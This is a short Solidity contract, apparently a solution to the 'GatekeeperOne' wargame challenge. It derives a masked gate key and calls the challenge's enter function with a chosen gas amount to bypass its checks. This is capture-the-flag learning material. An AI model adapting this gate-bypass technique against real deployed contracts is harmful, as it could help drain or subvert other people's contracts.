// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import 'hardhat/console.sol';


interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external;
}

contract GatekeeperOneAttack {

    IGatekeeperOne public challenge;

    constructor(address _challenge) public {
        challenge = IGatekeeperOne(_challenge);
    }

    function attack(uint256 gasAmount, bytes8 attacker) public payable {
        // src: https://0xsage.medium.com/
        bytes8 key = bytes8(attacker) & 0xFFFFFFFF0000FFFF;
        challenge.enter{gas: gasAmount}(key);
    }
}
